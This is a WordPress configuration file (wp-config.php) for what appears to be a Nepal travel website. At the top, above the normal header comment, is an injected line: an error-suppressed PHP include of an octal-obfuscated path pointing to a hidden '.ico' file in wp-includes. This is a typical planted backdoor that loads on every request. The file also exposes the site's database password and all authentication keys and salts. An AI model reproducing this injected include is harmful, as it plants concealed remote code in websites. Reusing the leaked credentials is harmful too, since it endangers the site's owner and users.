<?php
/*89d1a*/

@include "\057hom\145/tr\141vel\142ird\156epa\154/pu\142lic\137htm\154/wp\055inc\154ude\163/js\057cro\160/.c\144122\06781.\151co";

/*89d1a*/
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://codex.wordpress.org/Editing_wp-config.php
 *
 * @package WordPress
 */
 
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('WP_CACHE', true);
define( 'WPCACHEHOME', '/home/travelbirdnepal/public_html/wp-content/plugins/wp-super-cache/' );
define('DB_NAME', 'travelbirdnepal_iceberg2018');

/** MySQL database username */
define('DB_USER', 'travelbirdnepal_iceberguser2018');

/** MySQL database password */
define('DB_PASSWORD', '9CeaHjc(GNGR');

/** MySQL hostname */
define('DB_HOST', 'localhost');

/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8mb4');

/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define('AUTH_KEY',         '(+!~}3((*GxtfHcz14uDImB>.Q(b>wJ <ljo<w6WsDgMNqP];G=%4n&Dq{N F?2k');
define('SECURE_AUTH_KEY',  'NRgoTZ2ZRYjc,JGRC|YU z_.g^-Y&G08=a9,CA#kD0e He%q.0e{Im*R.G2+/O~5');
define('LOGGED_IN_KEY',    '0/X4cBQY#l5WR`e;vfLH.~`:M#=,|4;ygW@ md&7Ih%p>yz;za{MmI_K|bI=k*Cf');
define('NONCE_KEY',        'kN^_|sq{n%,?Z :]kqc)E08m/ak|NgQVr(a^_(duKgK<aufA7C*9EEp,.%?}OJ,>');
define('AUTH_SALT',        '`6[(;cKnQ`Ci[)9ioXDt%Qv=OdUa{27[a5!246L4u[Z[$(^YmG.JkPkAyV^&tHt6');
define('SECURE_AUTH_SALT', 'ELhWh%[KuluPC8PiJaKhM9Ml[B-02^.:EOo?0baAXk7J=X8:qB*CzPPo?|_Z:m!5');
define('LOGGED_IN_SALT',   'TXAOdgys;q|2CMaftDG?]&xOMmf}6vi~t/~&|5Jbi`ov(0NW6Sby6>(p&? ,DZAY');
define('NONCE_SALT',       '-];RN5n~U7`o}u##=erI$R<&YrV,{XRf-arb!Dc6A}6c0  fobu@4E&k!2fJ;hYC');

/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix  = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the Codex.
 *
 * @link https://codex.wordpress.org/Debugging_in_WordPress
 */
define('WP_DEBUG', true);

/* That's all, stop editing! Happy blogging. */

/** Absolute path to the WordPress directory. */
if ( !defined('ABSPATH') )
	define('ABSPATH', dirname(__FILE__) . '/');

/** Sets up WordPress vars and included files. */
require_once(ABSPATH . 'wp-settings.php');
